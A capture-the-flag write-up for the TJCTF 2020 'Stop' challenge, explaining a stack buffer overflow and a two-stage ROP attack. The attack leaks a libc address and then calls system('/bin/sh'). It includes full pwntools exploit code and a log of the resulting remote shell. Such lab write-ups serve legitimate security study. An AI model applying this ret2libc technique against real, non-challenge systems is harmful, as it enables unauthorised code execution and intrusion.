# TJCTF 2020

## Stop

> 70
>
> I love playing stop, but I am tired of losing. Check out my new [stop answer generator](stop)!
>
> It's a work in progress and only has a few categories, but it's 100% bug-free!
> 
> `nc p1.tjctf.org 8001`
>
> Written by KyleForkBomb

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _rop_ _libc_


## Summary

Leak libc address and version, return to `main` for a second exploit, get a shell, get the flag.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Some mitigations.  !GOT.  No shellcode.  But, we have ROPtions (no PIE).  Stack left wide open, too.

    
### Decompile with Ghidra

![](main.png)

Lines 8 and 34 together are the vulnerability; a buffer (`local_118`) of `256` bytes, but read allows `0x256` (598) bytes.  Before we can do anything interesting we'll have to leak the address and version of libc.  Since there's no loop, we'll also have to return to main for a second pass.

`local_118` is `0x118` bytes above the return address:

```
             undefined8        RAX:8              <RETURN>
             undefined4        Stack[-0xc]:4      local_c
             undefined4        Stack[-0x10]:4     local_10
             undefined4        Stack[-0x14]:4     local_14
             undefined4        Stack[-0x18]:4     local_18
             undefined1        Stack[-0x118]:1    local_118
```

Both attacks will write out `0x118` bytes to get to the return address.


## Exploit

### Attack Plan

1. Leak libc address and version and return to main
2. Get a shell, get the flag


### Leak libc address and version and return to main

```python
#!/usr/bin/python3

from pwn import *

#p = process('./stop')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('p1.tjctf.org', 8001)
libc = ELF('libc-database/db/libc6_2.27-3ubuntu1_amd64.so')

binary = ELF('./stop')

context.clear(arch='amd64')
rop = ROP('stop')
try:
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
    print("no ROP for you!")
    sys.exit(1)

p.recvuntil('Which letter? ')
p.sendline('A')
p.recvuntil('Category? ')

payload  = b''
payload += 0x118 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binary.got['printf'])
payload += p64(binary.plt['printf'])
payload += p64(pop_rdi + 1)
payload += p64(binary.symbols['main'])

p.sendline(payload)
p.recvline()
p.recvline()
_ = p.recv(6)
```

Since there's no PIE we do not need to worry about leaking the base process address.  All we need is a `pop rdi` gadget and have `printf` print its own address.

> The extra returns (`payload += p64(pop_rdi + 1)`) is required to align the stack, see [Blind Piloting](https://github.com/datajerk/ctf-write-ups/blob/master/b01lersctf2020/blind-piloting/README.md) for a lengthly example and explanation.

After sending `0x118` bytes to get to the return address, we just pop a return, then pop the address of `printf` from the GOT, then call `printf` to print it, then align the stack again , and then return to main for a second run.

With the `printf` address leaked (`_ = p.recv(6)`) we can search for the version using the [libc-database](https://github.com/niklasb/libc-database) `find` command with the last three nibbles of the `printf` address:

```
# libc-database/find printf e80 | grep -v 386
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
```

Then rerun with:

```
libc = ELF('libc-database/db/libc6_2.27-3ubuntu1_amd64.so')
```

to then leak the base address of libc:

```
printf = u64(_ + 2*b'\x00')
print('printf:',hex(printf))
baselibc = printf - libc.symbols['printf']
print('baselibc:',hex(baselibc))
```

> You'll know you got this right if the last three digits of the libc address is all zeros.  See output below.


### Get a shell, get the flag

```python
p.recvuntil('Which letter? ')
p.sendline('A')
p.recvuntil('Category? ')

payload  = b''
payload += 0x118 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(baselibc + next(libc.search(b"/bin/sh")))
payload += p64(baselibc + libc.symbols['system'])

p.sendline(payload)
p.interactive()
```

For the second pass, align the stack, pop the address of the string `/bin/sh` from libc, and then _return_ to `system` to get a shell:

```
# ./exploit.py
[+] Opening connection to p1.tjctf.org on port 8001: Done
[*] '/pwd/datajerk/tjctf2020/stop/libc-database/db/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/tjctf2020/stop/stop'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 15 cached gadgets for 'stop'
printf: 0x7f4877692e80
baselibc: 0x7f487762e000
[*] Switching to interactive mode

Sorry, we don't have that category yet
$ cat flag.txt
tjctf{st0p_th4t_r1ght_now}
```
